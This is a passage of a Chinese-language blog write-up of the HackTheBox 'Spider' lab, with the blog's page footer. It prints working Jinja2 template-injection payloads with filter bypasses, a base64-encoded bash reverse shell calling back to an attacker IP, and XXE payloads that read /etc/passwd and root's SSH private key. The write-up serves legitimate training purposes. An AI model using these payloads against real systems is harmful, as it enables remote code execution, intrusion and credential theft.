+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request</span>|attr(<span class="hljs-name">&#x27;application&#x27;</span>)|attr(<span class="hljs-name">&#x27;\x5f\x5fglobals\x5f\x5f&#x27;</span>)|attr(<span class="hljs-name">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>)(<span class="hljs-name">&#x27;\x5f\x5fbuiltins\x5f\x5f&#x27;</span>)|attr(<span class="hljs-name">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>)(<span class="hljs-name">&#x27;\x5f\x5fimport\x5f\x5f&#x27;</span>)(<span class="hljs-name">&#x27;os&#x27;</span>)|attr(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;id&#x27;</span>)|attr(<span class="hljs-name">&#x27;read&#x27;</span>)()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>输入发现过滤了单引号<code>&#39;</code>，将单引号替换成双引号</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request</span>|attr(<span class="hljs-name">&quot;application&quot;</span>)|attr(<span class="hljs-name">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="hljs-name">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="hljs-name">&quot;\x5f\x5fbuiltins\x5f\x5f&quot;</span>)|attr(<span class="hljs-name">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="hljs-name">&quot;\x5f\x5fimport\x5f\x5f&quot;</span>)(<span class="hljs-name">&quot;os&quot;</span>)|attr(<span class="hljs-name">&quot;popen&quot;</span>)(<span class="hljs-name">&quot;id&quot;</span>)|attr(<span class="hljs-name">&quot;read&quot;</span>)()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后是发现<code>&#123;&#123;&#125;&#125;</code>被过滤，使用<code>&#123;%include ...%&#125;</code>的方式进行绕过：</p>
+<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;% include request|attr(<span class="hljs-string">&quot;application&quot;</span>)|attr(<span class="hljs-string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="hljs-string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="hljs-string">&quot;\x5f\x5fbuiltins\x5f\x5f&quot;</span>)|attr(<span class="hljs-string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="hljs-string">&quot;\x5f\x5fimport\x5f\x5f&quot;</span>)(<span class="hljs-string">&quot;os&quot;</span>)|attr(<span class="hljs-string">&quot;popen&quot;</span>)(<span class="hljs-string">&quot;id&quot;</span>)|attr(<span class="hljs-string">&quot;read&quot;</span>)() %&#125;<br></code></pre></td></tr></table></figure>
+
+<p>成功执行后服务器会报500的错误，没有回显。通过sleep函数判断是否能够执行命令，发现可以：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211024123656754-16350657290622.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211024123656754"></p>
+<p>接着构造反弹shell的payload，使用base64编码：</p>
+<p>这里不知道为什么直接的<code>bash -i &gt;&amp; /dev/tcp/10.10.16.33/4455 0&gt;&amp;1</code>不能起作用，知道的师傅可以教教</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">bash -c <span class="hljs-string">&#x27;exec bash -i &gt;&amp; /dev/tcp/10.10.16.33/4455 0&gt;&amp;1&#x27;</span> <span class="hljs-attr">#原payload</span><br><span class="hljs-attr">YmFzaCAtYyAnZXhlYyBiYXNoIC1</span>pID<span class="hljs-number">4</span>mIC<span class="hljs-number">9</span>kZXYvdG<span class="hljs-symbol">NwLzEwLjEwLjE2</span>LjMzLzQ<span class="hljs-number">0</span><span class="hljs-symbol">NTUgMD4</span>mMSc= <span class="hljs-attr">#Base64</span>编码<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;% include request|attr(<span class="hljs-string">&quot;application&quot;</span>)|attr(<span class="hljs-string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="hljs-string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="hljs-string">&quot;\x5f\x5fbuiltins\x5f\x5f&quot;</span>)|attr(<span class="hljs-string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="hljs-string">&quot;\x5f\x5fimport\x5f\x5f&quot;</span>)(<span class="hljs-string">&quot;os&quot;</span>)|attr(<span class="hljs-string">&quot;popen&quot;</span>)(<span class="hljs-string">&quot;echo -n YmFzaCAtYyAnZXhlYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjMzLzQ0NTUgMD4mMSc= | base64 -d | bash&quot;</span>)|attr(<span class="hljs-string">&quot;read&quot;</span>)() %&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>拿到普通用户的shell：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023212859982.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211023212859982"></p>
+<p>直接去价目下的.ssh目录翻私钥，然后连接之：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023213515953.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211023213515953"></p>
+<h1 id="0x03-Root-Shell"><a href="#0x03-Root-Shell" class="headerlink" title="0x03 Root Shell"></a>0x03 Root Shell</h1><p>拿到User Shell后尝试提权，在查看网络连接的时候发现有8080端口。使用curl测试发现是不同的app：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211024170953998.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211024170953998"></p>
+<p>于是使用ssh进行本地转发：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -L <span class="hljs-number">8888</span>:localhost:<span class="hljs-number">8080</span> chiv@<span class="hljs-number">10.10.10.243</span> -i chiv<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211024171133075.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211024171133075"></p>
+<p>这里以任意用户都能登录，登录后会分配又一个flask的cookie：</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit">.eJxNjEFvgyAARv_KwnkH7WqTmexiAG03cKCActPRBC1as5HU2fS_z16aHb<span class="hljs-string">-8770</span>rcPPgQHwFTy2IgUAUGzSX7HSQXPlRDqE6KvLbZrprBN6W6ZQYEUJWcSIh_xDIvpthv4jCw5WPhaBJjqeM94m<span class="hljs-string">-8</span>_vWgYNMmQML0FZjm7cp9VTZTobiW0lTmBRXFFpCQr1Tbu1JVxE1M715Hf_7PLOXekFRs_ZJlXRNz18EItFXSuZc2YYv-FIP56B4_M1GnUxKsBMUecYWF9X9PiI4GT_L4A3cnsF07kb_A-Lg9gfxF1a8.YXQcMA._xj9xfPtBO9gayEARbgbcNUl<span class="hljs-string">-48</span><br></code></pre></td></tr></table></figure>
+
+<p>解密如下：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">┌──(kali㉿kali)-<span class="hljs-selector-attr">[~/桌面]</span><br>└─$ flask-unsign <span class="hljs-attr">--decode</span> <span class="hljs-attr">--cookie</span> <span class="hljs-selector-class">.eJxNjEFvgyAARv_KwnkH7WqTmexiAG03cKCActPRBC1as5HU2fS_z16aHb-8770rcPPgQHwFTy2IgUAUGzSX7HSQXPlRDqE6KvLbZrprBN6W6ZQYEUJWcSIh_xDIvpthv4jCw5WPhaBJjqeM94m-8_vWgYNMmQML0FZjm7cp9VTZTobiW0lTmBRXFFpCQr1Tbu1JVxE1M715Hf_7PLOXekFRs_ZJlXRNz18EItFXSuZc2YYv-FIP56B4_M1GnUxKsBMUecYWF9X9PiI4GT_L4A3cnsF07kb_A-Lg9gfxF1a8</span><span class="hljs-selector-class">.YXQcMA</span>._xj9xfPtBO9gayEARbgbcNUl-<span class="hljs-number">48</span><br><br>&#123;<span class="hljs-string">&#x27;lxml&#x27;</span>: b<span class="hljs-string">&#x27;PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+YWRtaW48L3VzZXJuYW1lPgogICAgICAgIDxpc19hZG1pbj4wPC9pc19hZG1pbj4KICAgIDwvZGF0YT4KPC9yb290Pg==&#x27;</span>, <span class="hljs-string">&#x27;points&#x27;</span>: <span class="hljs-number">0</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Base64内容解码，发现有xml，推测存在xxe：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- API Version 1.0.0 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">is_admin</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">is_admin</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>开始查找利用点，抓包发现登录时有个version参数，这个会影响到后面cookie的生成：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211024103027313.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211024103027313"></p>
+<p>于是乎这里就很明显了，我们可以通过闭合注释注入xml代码，造成xxe。</p>
+<p>这里还有一点，就是username参数也在xml的便签中，我们便可以将输入<code>&amp;admin;</code>，将一个admin实体注入进去。</p>
+<p>构造payload如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=%26admin%3b&amp;version=1.0.0 --&gt;<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&#x27;file:///etc/passwd&#x27;</span>&gt;</span>]&gt;</span><span class="hljs-comment">&lt;!--</span><br></code></pre></td></tr></table></figure>
+
+<p>使用生成的cookie访问site，能够发现回显：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211024111438234.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211024111438234"></p>
+<p>这样的利用方式就比较简单了，我们直接读取root用户的私钥即可：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=%26admin%3b&amp;version=1.0.0 --&gt;<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&#x27;file:///root/.ssh/id_rsa&#x27;</span>&gt;</span>]&gt;</span><span class="hljs-comment">&lt;!--</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211024111818598.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211024111818598"></p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211024111806257.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211024111806257"></p>
+<p>保存后ssh登录即可：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211024125240826.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211024125240826"></p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E9%9D%B6%E5%9C%BA/" class="category-chain-item">靶场</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E9%9D%B6%E5%9C%BA/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/HackTheBox/">#HackTheBox</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox - Spider</div>
+      <div>https://m0ck1ng-b1rd.github.io/2021/12/07/HTB/Spider/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>何语灵</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2021年12月7日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/12/07/HTB/Sink/" title="HackTheBox - Sink">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox - Sink</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/12/07/HTB/StartingPoint-Archetype/" title="HackTheBox - StartingPoint-Archetype">
+                        <span class="hidden-mobile">HackTheBox - StartingPoint-Archetype</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'M0cK1nG-b1Rd/blog-comments');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://M0cK1nG-b1Rd.github.io" target="_blank" rel="nofollow noopener"><span>M0cK1nG-b1Rd</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Powered by Hexo&Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":250,"height":500,"hOffset":-30,"vOffset":-150},"mobile":{"show":true,"scale":0.5},"log":false});</script></body>
+</html>
